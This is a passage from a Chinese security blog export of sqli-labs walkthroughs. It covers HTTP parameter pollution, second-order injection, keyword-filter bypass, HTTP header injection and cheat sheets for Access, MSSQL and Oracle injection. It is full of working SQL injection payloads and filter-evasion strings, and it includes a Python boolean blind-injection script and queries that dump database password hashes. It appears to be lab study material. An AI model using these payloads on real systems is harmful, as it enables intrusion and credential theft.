处理的数据，id&#x3D;2。\nHTTP参数污染（HPP）由于服务器两层架构，往往tomcat服务器进行数据的过滤和处理，功能类似为一个WAF，通常利用此特性进行WAF绕过。\n\nHPP靶场记录一下Less-29–Less-31靶场的HPP\nLess-29首先Less-29也是弄了好长时间，也看了很多文章，由于是基于HPP的靶场，最重要的就是没有搭建Tomcat+Java+Mysql的环境，开始弄了好久。（最好是搭建好环境玩Less-29的靶场）\n首先需要打开login.php文件，不然这Less-29和Less-1没什么区别\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php\n\n\n判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&#39;\n\n这是提示赶走这个愚蠢的黑客，WAF成功阻拦攻击。\n\n（这里若搭建好Tomcat+Java+Mysql环境的话如下图：）\n\n从跳转到.jsp页面可以看出来是 Tomcat 服务器，一般来说，现在没有拿 jsp 写后台的了，大都用 php ，我们果断猜测是双服务器。（从这里才能判断这是双服务器）\n参考原文：https://www.cnblogs.com/li2019/p/12378585.html\n绕WAF这里已经知道第一个接收第一个参数的服务器是tomcat，接下来要构造payload进行绕过WAF。\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2\n\n可以看到页面回显的是第二个用户名和密码，此时接收参数的服务器是apache，接受了id&#x3D;2\n\n步骤判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&#39; order by 4--+\n\n由于对id值的处理需要&#39;，所以第二个参数需要进行单引号闭合\n\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-29&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&#39; union select 1,2,3--+\n\n\n后续过程的payload与以往相同。\n\nLess-30Less-30与Less-29原理相同，只是对id值做了&quot;处理。\n\npayload：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot; order by 4--+\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-30&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot; union select 1,2,3--+\n\n\nLess-31Less-31对id值进行了&quot;)的处理。\n\npayload：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;2&quot;) order by 4--+\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-31&#x2F;login.php?id&#x3D;1&amp;id&#x3D;-2&quot;) union select 1,2,3--+\n\n","slug":"SQL注入-HPP","date":"2022-02-10T05:11:20.000Z","categories_index":"SQL注入","tags_index":"SQL注入,基础知识","author_index":"Aurora"},{"id":"47679b9d369f170d867be494752fa62e","title":"POST注入-二次注入","content":"[TOC]\n##二次注入原理\n二次注入，主要分为两步；\n第一步：插入恶意数据\n​        第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是addslashes有一个特点就是虽然参数在过滤后会添加 “\\” 进行转义，但是“\\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据；\n第二步：引用恶意数据\n​        在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。\nLess-24由源码可得username和password字段使用了函数mysql_real_escape_string()对特殊字符进行了转义（mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。）\n\n插入数据库的恶意数据被数据库执行的语句：\n\n插入恶意数据将admin&#39;#进行注册，插入数据\n\n\n引用恶意数据数据库执行以下恶意语句：\n$sql = \"UPDATE users SET PASSWORD='123456' where username='admin'#' and password='' \";\n\n相当于执行的是：\n$sql = \"UPDATE users SET PASSWORD='123456' where username='admin'\n\n\n\n可见admin密码已被修改\n","slug":"POST注入-二次注入","date":"2022-02-09T03:31:17.000Z","categories_index":"SQL注入","tags_index":"SQL注入,基础知识","author_index":"Aurora"},{"id":"91c80453ca147ce2ce8eeaf9436ba64b","title":"SQL注入-关键字过滤的注入","content":"[TOC]\n关键字过滤的注入Less-23—Less-28a（Less-24除外）都是基于关键字过滤的注入，源码当中将--，#，or，and等关键字都过滤掉了，在这样的基础上进行 SQL注入。\nLess-23由源码可以看到，接收到的id值将被函数preg_replace()进行过滤，若id值当中有#和--将被会替换为&quot;&quot;，以至于注释符不能使用。\n\n没过滤时报错：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;1&#39; --+\n\n\n过滤时报错：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;1&#39; --+\n\n\n具体步骤探测注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1\n\n由于没有注释符，只能够将sql语句中的单引号闭合进行注入，这里回西安正常，注入成功。\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3\n\n\n爆库名和版本号：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,database(),&#39;version()\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,version(),&#39;3\n\n由于第一条语句第三个字段闭合单引号后形成字符串被代入数据库执行，导致爆出的只是字符串，回显点只能利用第二个字段。\n\n爆表名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),&#39;3\n\n由于不能使用注释符，只能够在第二个回显字段进行嵌套子查询爆表名。\n\n爆列名：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),&#39;3\n\n\n爆内容：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-23&#x2F;?id&#x3D;-1&#39; union select 1,(select concat(username,&#39;:&#39;,password) from security.users limit 0,1),&#39;3\n\n\n\nLess-25源码中，id值将or和and关键字进行了过滤：\n\n绕过思路1、绕过or和and一般思路：\n（1）大小写变形 Or,OR,oR \n（2）编码，hex，urlencode \n（3）内联注释/*or*/ \n（4）利用符号 and=&amp;&amp; or=||\n（5）双写绕过oorr,aandnandd\n2、由于对空格的过滤，可以使用：\n%09 TAB 键（水平） \n%0a 新建一行 \n%0c 新的一页 \n%0d return 功能 \n%0b TAB 键（垂直） \n%a0 空格\n内联注释举例：\n&#x2F;* *&#x2F; 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行，如图：\n\n具体步骤这里使用and=&amp;&amp; or=||进行绕过：判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; || 1&#x3D;1 --+\n\n\n判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;1&#39; oorrder by 4--+\n\n判断字段数时由于order字段有关键字or，这里使用双写绕过。\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+\n\n爆库爆版本号：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,database(),version()S--+\n\n爆表：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database() limit 0,1),3--+\n\n爆字段：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),3--+\n\n爆内容：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,passwoorrd) from security.users--+\n\n\nLess-25a源码中没有对id值做任何处理，这里使用双写绕过。\n这里还对报错回显进行了过滤，报错注入不能用。\n\n具体步骤判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25a&#x2F;?id&#x3D;1 aandnandd 1&#x3D;1 --+\n\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-25a&#x2F;?id&#x3D;-1 union select 1,2,3 --+\n\n\n（union字段前面的语句不是为了报错，要使用正确的语法但不存在的字段）\n这里除了使用联合注入，还可以使用时间盲注和布尔盲注。\n\nLess-26源码中过滤如下：\n\n这里的思路应该是将Less-23和Less-25的payload结合一下即可。\n具体步骤判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;1&#39; oorr &#39;1&#39;&#x3D;&#39;1\n\n\n判断字段数：\n由于对空格的过滤，可以使用：\n%09 TAB 键（水平） \n%0a 新建一行 \n%0c 新的一页 \n%0d return 功能 \n%0b TAB 键（垂直） \n%a0 空格\n这些编码进行绕过，但由于window下apache解析的问题，这些编码都不能进行解析，导致绕过失败（可以放在linux平台下，这些编码都可进行绕过）\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;1&#39;%0b oorrder%0bby%0b&#39;4\n\n\n由于判断字段数或者联合注入这些payload都避免不了用到空格，所以这里使用报错注入。\n爆库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(database()),0x7e))||&#39;1&#39;&#x3D;&#39;2\n\n这里使用双写绕过的话会使用到空格，所以，在使用oorr的地方使用||进行绕过\n\n爆表：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;database())),0x7e))||&#39;1&#39;&#x3D;&#39;1\n\n这里爆表的时候由于不能使用空格，每一条查询语句只能够使用()来代替。\n\n爆字段：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e))||&#39;1&#39;&#x3D;&#39;1\n\n爆内容：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(username))from(users)),0x7e))||&#39;1&#39;&#x3D;&#39;1\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26&#x2F;?id&#x3D;-1&#39;||extractvalue(1,concat(0x7e,(select(group_concat(password))from(users)),0x7e))||&#39;1&#39;&#x3D;&#39;1\n\n\nLess-26a源码将报错过滤掉，导致报错注入失效：\n\n具体步骤判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-26a&#x2F;?id&#x3D;1&#39;)||(&#39;1&#39;)&#x3D;(&#39;1\n\n\n这里报错注入用不了，在windows平台下使用时间盲注或者布尔盲注进行注入，使用编码注入只能换到linux平台下进行，payload与以往相同。\n布尔盲注脚本：\nimport sys\nimport requests\n\ndef getPayload(char_index, ascii):\n    # 系统表中数据\n    info_database_name = \"infoorrmation_schema\"\n    info_table_name = \"schemata\" # schemata / tables / columns\n    info_column_name = \"schema_name\" # schema_name / table_name / column_name\n    \n    # 注入表中数据\n    database_name = \"security\"\n    table_name = \"users\"\n    column_name = [\"id\",\"username\",\"passwoorrd\"]\n    \n    # 附加url\n    start_str = \"1'%26%26\"\n    end_str = \"||'1'='\"\n    \n    # 连接select\n    where_str = \"\"\n    #where_str = \"where(table_schema='\"+database_name+\"'%26%26table_name='\"+table_name+\"')\"\n    select_str = \"select(group_concat(\"+info_column_name+\"))from(\"+info_database_name+\".\"+info_table_name+\")\"+where_str\n    #select_str = \"select(group_concat(concat_ws('$',\"+column_name[0]+\",\"+column_name[1]+\",\"+column_name[2]+\")))from(\"+table_name+\")\"\n    \n    # 连接payload\n    sqli_str = \"(ascii(mid((\"+select_str+\"),\"+str(char_index)+\",1))>\"+str(ascii)+\")\"\n    payload = start_str + sqli_str + end_str\n    return payload\n\ndef execute(char_index, ascii):\n    # 连接url\n    url = \"http://localhost:8088/sqlilabs/Less-26/?id=\"\n    exec_url = url + getPayload(char_index, ascii)\n    #print(exec_url)\n    # 检查回显\n    echo = \"Your Login name\"\n    content = requests.get(exec_url).text\n    if echo in content:\n        return True\n    else:\n        return False\n\ndef dichotomy(char_index, left, right):\n    while left &lt; right:\n        # 二分法\n        ascii = int((left+right)/2)\n        if execute(str(char_index+1), str(ascii)):\n            left = ascii\n        else:\n            right = ascii\n        # 结束二分\n        if left == right-1:\n            if execute(str(char_index+1), str(ascii)):\n                ascii += 1\n                break\n            else:\n                break\n    return chr(ascii)\n\nif __name__ == \"__main__\":\n    for len in range(1024): # 查询结果的长度\n        char = dichotomy(len, 30, 126) \n        if ord(char) == 31: # 单条查询结果已被遍历\n            break\n        sys.stdout.write(char)\n        sys.stdout.flush()\n    sys.stdout.write(\"\\r\\n\")\n    sys.stdout.flush()\n\n参考原文：https://www.jianshu.com/p/ff72f2c6d99c\n\nLess-27源码分析：\n在Less-26的基础上Less-27将union和select字段进行了过滤：\n\n\\s表示空白字符空格、制表符、换页符等，/i表示忽略大小写。\n具体步骤使用编码注入判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39;%0band%0b&#39;1&#39;&#x3D;&#39;1\n\n\n爆库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39; and(extractvalue(1,concat(0x7e,database(),0x7e)))and&#39;1&#39;&#x3D;&#39;1\n\n\n爆表：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27&#x2F;?id&#x3D;1&#39; and(extractvalue(1,concat(0x7e,(seselselectectlect(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e)))and&#39;1&#39;&#x3D;&#39;1\n\n\n后续过程如以往。\n\nLess-27a判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;1&quot; &quot;\n\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSElECT%0b1,2,3%0bor%0b&quot;1&quot;&#x3D;&quot;1\n\n\n爆库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,database(),3%0bor%0b&quot;1&quot;&#x3D;&quot;1\n\n\n爆表：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(table_name),3%0bFROM%0binformation_schema.tables%0bWHERE%0btable_schema &#x3D; &#39;security&#39;%0bor%0b&quot;1&quot;&#x3D;&quot;2\n\n\n爆字段：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(column_name),3%0bFROM%0binformation_schema.columns%0bWHERE%0btable_schema&#x3D;&#39;security&#39;%0bAND%0btable_name&#x3D;&#39;users&#39;%0bor%0b&quot;1&quot;&#x3D;&quot;\n\n\n爆内容：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-27a&#x2F;?id&#x3D;9999&quot;%0bUNiON%0bSELeCT%0b1,group_concat(concat_ws(&quot;:&quot;,username,password)),3%0bFROM%0busers%0bWHERE%0b&quot;1\n\n\n\nLess-28判断注入点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1&#39;) OR (&#39;1\n\n\n判断字段数：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0bORDER%0bBY%0b3%0bor%0b(&#39;1&#39;)&#x3D;(&#39;1\n\n\n判断回显点：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,2,&#39;3\n\n\n爆库：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,(select(group_concat(schema_name))from(information_schema.schemata) ),&#39;3\n\n\n爆表：\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-28&#x2F;?id&#x3D;1.1&#39;)union(select%0d1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()) ),&#39;3\n\n\n\nLess-28a盲注，只过滤了union+select，单引号括号闭合。可以使用空格和注释\n\n具体步骤布尔盲注猜字段：\n数据库长度：?id=1&#39;) and length((database()))=8 --+\n猜数据库名：?id=1&#39;) and substr((select database()),1,1)=&quot;s&quot; --+\n猜表长：?id=1&#39;) and length((select table_name from information_schema.tables where table_schema=database() limit 0,1) )=6 --+\n猜表名：?id=1&#39;) and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&quot;e&quot; --+\n","slug":"SQL注入-关键字过滤的注入","date":"2022-02-08T15:40:16.000Z","categories_index":"SQL注入","tags_index":"SQL注入","author_index":"Aurora"},{"id":"11c6b3c7b164ff24fb9d530dce97a986","title":"SQL注入-Oracle等注入","content":"[TOC]\n##数据库注入\n除Access数据库之外，其他类型数据库注入流程：\n\n什么决定网站注入点的用户权限？\nSQL的配置文件用户名\n\nAccess注入（特殊）####Access数据结构\n​               表名\n​                       列名\n​                               数据\n注意：1、Access数据库只有一个数据库；\n​            2、 Access数据库只能靠暴力猜解；\n​            3、 一般Access数据库与ASP网站一起搭建；\n​            4、 Access没有数据库名，没有版本号，统统都没有；\n​            5、 注入的时候无需查询什么版本等等。\n​            6、 access无注释符\n注入方法：1、联合查询法\n2、逐字猜解法（常用）\n联合注入：第一步：判断注入点\n?id&#x3D;1 and 1&#x3D;1返回正常\n?id&#x3D;1 and 1&#x3D;2返回错误’\n存在注入点。\n\n第二步：判断列的字段数\n?id&#x3D;1 order by 3返回正常\n?id&#x3D;1 order by 4返回错误\n字段数为3\n\n第三步：猜解表名（判断回显点）\n?id&#x3D;1 union select 1,2,3 from 表名\n\n第四步：猜解列名\n?id&#x3D;1 union select 1,列名一,列名二 from 表名\n猜出列名则会返回数据\n把上面得到的那两个数字中替换成表中的用户名与密码字段名：\n例：username 和 password\n\n第五步：爆出数据\n?id&#x3D;1 union select 1,admin,password from 表名\n回显点2爆出用户名，回显点3爆出密码\n\n\n\n#####逐字猜解法：（适用于 order by 不能用的地方）\n第一步：判断注入点\n?id&#x3D;1&#39; 单引号注入\n?id&#x3D;1 and 1&#x3D;1 数字型注入\n\n第二步：判断字段数\n?id&#x3D;1 order by 3返回正常\n?id&#x3D;1 order by 4返回错误\n字段数为3\n\n第三步：猜表名\n?id&#x3D;1 and exists (select * from admin) ——猜表名\n\n第四步：猜列名\n?id&#x3D;1 and exists (select username&#x2F;password from admin) ——猜列名\n\n第五步：猜字段中数据长度（1.确定长度 2.确定asc数据）\n?id&#x3D;1 and (select top 1 len(username ) from admin)&gt;5  --判断长度\n?id&#x3D;1 and (select top 1 asc(mid(username ,1,1)) from admin(表名))&#x3D;97 判断字段第一位(后几位依次类推)\n\ntop（附属查询）：\n例：top 1 用来返回第一行的内容（也可以用来限制返回内容的行数）\n\nMSSQL(SQL Server)注入常用框架组合方法ASP+MSSQL\n1、判断数据库类型\nand exists (select * from sysobjects)--返回正常为mssql（也名sql server）\nand exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个\n（sysobjects：MSSQL数据库特有的数据表，系统对象表）\n（Exists()：子语句查询，Exists方法返回一个布尔值，该布尔值指示在 Dictionary 对象中是否存在指定的 key，如果存在，返回 true，否则返回 false）\n\n2、判断当前数据库\nselect db_name(N)  表示当前数据库，其中的参数表示第N个数据库，从0开始\n\n3、查看所有数据库\nSELECT top 1 Name FROM Master..SysDatabases  在系统数据库中能够查询所有的数据库\n（Master系统数据库）\n\n4、注入点权限判断（根据页面显示效果）\n1 select is_srvrolemember(&#39;sysadmin&#39;);判断当前是否为sa\n2 select is_srvrolemember(&#39;db_owner&#39;);判断当前用户写文件、读文件的权限（db_owner）\n3 select is_srvrolemember(&#39;public&#39;);  判断是否有public权限，可以爆破表\n\n5、查看数据库版本\nselect @@version\n\n6、查询表名\nselect top 1 name from test.sys.all_objects where type&#x3D;&#39;U&#39; AND is_ms_shipped&#x3D;0  获取第一个表名\n\n7、查询列名\nselect top 1 COLUMN_NAME from test.information_schema.columns where TABLE_NAME&#x3D;&#39;users&#39;\n\n8、获取字段数据\nselect top 1 username from users\nselect top 1 password from users\n\n\nOracle注入引导：\ndual表，此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生\n\n与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual\n\n涉及到的基本用法：\n\nselect * from all_tables 查询出所有的表\n\nselect * from user_tables 查询出当前用户的表\n\nselect * from all_tab_columns 查询出所有的字段\n\nselect * from user_tab_columns  查询出当前用户的字段\n\nselect * from v$version 查版本\n\nrownum&#x3D;1   (限制查询返回的总行数为一条)\n\n对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。\n\n\n\n注入语句：（Oracle 字符串区分大小写）\n获取数据库版本：\nSELECT banner FROM v$version WHERE banner LIKE 'Oracle%';\nSELECT version FROM v$instance;\n\n获取数据库系统版本：\nSELECT banner FROM v$version where banner like 'TNS%';\n\n获取当前数据库用户：\nSELECT user FROM dual;\nselect SYS_CONTEXT('USERENV','CURRENT_USER') from dual\n\n获取当前用户权限：\nSELECT * FROM session_privs;\n\n获取所有数据库用户密码：\nselect name, password, spare4 from sys.user$\n\n获取DB文件路径：\nSELECT name FROM V$DATAFILE;\n\n列出DBA账户：\nSELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’ \n\n服务器监听IP：\nselect utl_inaddr.get_host_address from dual\n\n获取当前操作系统：\nSELECT  dbms_utility.port_string FROM dual;\nselect member from v$logfile where rownum=1  //路径也是可以判断的\n\n获取服务器SID：\nselect instance_name from v$instance\n\n列出数据库：\nSELECT DISTINCT owner FROM all_tables; — 列出数据库 (一个用户一个)\n\n联合注入语句：\n（Oracle区分大小写）\n判断字段：\norder by\nunion select null,'null' 根据'' 判断哪里是字符串\n\n爆表:\nunion select 1,(select table_name from user_tables where rownum=1) from dual\n\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual\n\n爆字段:\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual\n\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名' and column_name not in ('第一个字段')) from dual\n\n爆数据:\nunion select 1,字段1||字段2...||字段n from 表名 where rownum=1 --\n连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串\n\n通过字段名查找对应的表：\nSELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%USERNAME%'\n\n其盲注语句和OOB等，参考文章：https://www.cnblogs.com/R0ser1/p/15387539.html\n","slug":"SQL注入-Oracle等注入","date":"2022-02-07T10:57:10.000Z","categories_index":"信息搜集","tags_index":"信息搜集","author_index":"Aurora"},{"id":"8d3782033a7b54632cfb455b67ca9836","title":"POST注入-HTTP头注入","content":"[TOC]\n0x00原理：HTTP头中的参数带入到数据库被执行，造成了HTTP头注入。\n$_SERVER详解$_SERVER['SCRIPT_NAME']          //当前脚本的路径\ndirname($_SERVER['SCRIPT_NAME']  //dirname() 返回路径中的目录部分\n$_SERVER['SCRIPT_FILENAME']      //当前脚本执行的绝对路径\n$_SERVER['HTTP_HOST']            //获取当前域名\n$_SERVER['SERVER_NAME']          //输出配置文件httpd.conf中的ServerName，一般情况下与HTTP_HOST值相同\n$_SERVER['SystemRoot']           //当前服务器的操作系统的目录\n$_SERVER['SERVER_SOFTWARE']      //服务器软件配置信息\n$_SERVER['SERVER_PORT']          //服务器端口\n$_SERVER ['REMOTE_PORT']         //用户连接到服务器时所使用的端口\n$_SERVER['SERVER_ADDR']          //服务器的ip地址\n$_SERVER['REMOTE_ADDR']          //浏览网页的用户ip。\n$_SERVER['DOCUMENT_ROOT']        //当前运行脚本所在的根目录\n$_SERVER['REQUEST_SCHEME']       //服务器通信协议，是http或https。\n$_SERVER['SERVER_ADMIN']         //服务器管理员信息\n$_SERVER['REQUEST_METHOD']       //请求数据的方式\n$_SERVER['REQUEST_URI']          //当前脚本路径，根目录之后的目录\n$_SERVER['PHP_SELF']             //当前正在执行脚本的文件名\n$_SERVER['REQUEST_TIME']         //得到请求开始时的时间戳。\n$_SERVER['HTTP_COOKIE']          //获取浏览器的cookie信息。\n$_SERVER['HTTP_CONNECTION']      //当前请求的连接情况\n$_SERVER['HTTP_USER_AGENT']      //获取用户相关信息，包括用户浏览器、操作系统等信息\n$_SERVER['HTTP_ACCEPT']          //当前请求的ACCEPT头部信息\n$_SERVER['HTTP_ACCEPT_LANGUAGE'] //返回用户默认的语言设置，后面的q值表示用户对该语言的喜好程度\n\n\n\n0x01（useragent注入）Less-18\n查看源码可知有以下注意点：\n\n$_SERVER['HTTP_USER_AGENT']      //获取用户相关信息，包括用户浏览器、操作系统等信息\n$_SERVER['REMOTE_ADDR']          //浏览网页的用户ip。\n\n由于对uname和passwd进行了check_input()函数处理，导致在这两个字段上注入时不行的：\n\n但在源码中有了Insert字段，可以从这里入手。\n\n\n0x02先尝试admin和admin登录，页面返回User Agent信息，由此在HTTP头里进行User Agent字段注入\n\n0x03抓包改包：\n抓包后将User Agent随便添加了几个字符，页面也同样返回了几个字符：\n\n\n\n0x04爆库：\nUser-Agent: &#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n\n$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;\n\nand前的&#39;是将&#39;$uagent&#39;中的前&#39;进行闭合，使用or &#39;1&#39;=&#39;1将&#39;$uagent&#39;后面的&#39;闭合；\n\n\n0x05爆版本号：\n&#39;and extractvalue(1,concat(0x7e,(select version()),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n\n0x06在爆表名的时候由于一个地方不知道什么原因试了很久，记录一下：\n这里一开始注入的是以下语句：\nUser-Agent: &#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n页面没有爆出表；\n\n\n当把and改成or才爆出表名：\nUser-Agent: &#39;or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n\n\n这里进行了一个实验，应该是出现上述情况的原因：\n注入语句用and连接的话，单引号闭合之后形成的是&#39;&#39;代表空值，而后面的extractvalue()查询到结果为真，也就是1，在mysql中实验如图：\n\n空值和1and完之后为0，可能导致数据库不返回报错信息，导致没有爆出表名。\n0x07爆字段：\nUser-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n\nUser-Agent: &#39;or extractvalue(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 5,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n\n0x08爆内容：\nUser-Agent: &#39;or extractvalue(1,concat(0x7e,(select concat(username,&#39;:&#39;,password) from users limit 0,1),0x7e)) and &#39;1&#39;&#x3D;&#39;1\n\n\n\n0x01（referer注入）Less-19\nHTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。\n首先输入admin和admin页面返回Referer信息，据此可知19关的思路应该是 Referer注入。\n\n0x02抓包后随便修改Referer值页面返回同样是修改后的内容：\n\n0x03爆库名：\nReferer: &#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39; &#x3D;&#39;1\n\n\n爆表名：\nReferer: &#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)) and &#39;1&#39; &#x3D;&#39;1\n\n爆字段：\nReferer: &#39; or extractvalue(1,concat(0x7e,(select 